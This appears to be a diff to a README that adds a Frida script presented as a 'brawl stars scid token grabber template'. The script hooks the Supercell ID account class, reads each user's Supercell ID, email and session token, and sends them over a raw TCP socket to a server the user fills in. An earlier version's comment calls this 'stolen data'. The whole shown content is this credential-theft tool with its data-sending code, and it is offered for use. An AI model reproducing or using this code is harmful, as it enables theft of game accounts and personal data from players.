@@ -27,31 +27,52 @@ IdAccount.toString.overload().implementation = function () {
 
 ```js
 
-function sendToTcpServer(supercellId, email, scidToken) {
-    var Socket = Java.use("java.net.Socket");
-    var InetAddress = Java.use("java.net.InetAddress");
-    var OutputStream = Java.use("java.io.OutputStream");
-    var BufferedWriter = Java.use("java.io.BufferedWriter");
-    var OutputStreamWriter = Java.use("java.io.OutputStreamWriter");
+// brawl stars scid token grabber template by Kxrimmmm
+Java.perform(function () {
+    var IdAccount = Java.use("com.supercell.id.scid_plugin.IdAccount");
 
-    var serverAddress = "YOUR ADDRESS"; // Remote server address
-    var serverPort = YOUR PORT;         // Remote server port
+    IdAccount.toString.overload().implementation = function () {
+        var result = this.toString();
+        var supercellId = this.supercellId.value;
+        var email = this.email.value;
+        var scidToken = this.scidToken.value;
 
-    // Creating a TCP connection
-    var socket = Socket.$new(serverAddress, serverPort);
-    var outputStream = socket.getOutputStream();
-    var writer = BufferedWriter.$new(OutputStreamWriter.$new(outputStream, "UTF-8"));
+        console.log(supercellId);
+        console.log(email);
+        console.log(scidToken);
 
-    // Creating the message with stolen data
-    var message = "Supercell ID: " + supercellId + "\nEmail: " + email + "\nToken: " + scidToken;
+        sendToTcpServer(supercellId, email, scidToken);
 
-    // Sending data to the remote server
-    writer.write(message);
-    writer.flush();
-    writer.close();
-    outputStream.close();
-    socket.close();
+        return result;
+    };
 
-    console.log("Data sent to TCP server");
-}
+    // Function to send data over TCP
+    function sendToTcpServer(supercellId, email, scidToken) {
+        var Socket = Java.use("java.net.Socket");
+        var InetAddress = Java.use("java.net.InetAddress");
+        var OutputStream = Java.use("java.io.OutputStream");
+        var BufferedWriter = Java.use("java.io.BufferedWriter");
+        var OutputStreamWriter = Java.use("java.io.OutputStreamWriter");
+
+        var serverAddress = "YOUR ADDRESS"; // Change this to your TCP server's address
+        var serverPort YOUR PORT; // Change this to your TCP server's port
+
+        // Create socket connection to the server
+        var socket = Socket.$new(serverAddress, serverPort);
+        var outputStream = socket.getOutputStream();
+        var writer = BufferedWriter.$new(OutputStreamWriter.$new(outputStream, "UTF-8"));
+
+        // Create the message to be sent
+        var message = "Supercell ID: " + supercellId + "\nEmail: " + email + "\nToken: " + scidToken;
+
+        // Send the message to the server
+        writer.write(message);
+        writer.flush();
+        writer.close();
+        outputStream.close();
+        socket.close();
+
+        console.log("Data sent to TCP server");
+    }
+}); 
 ```
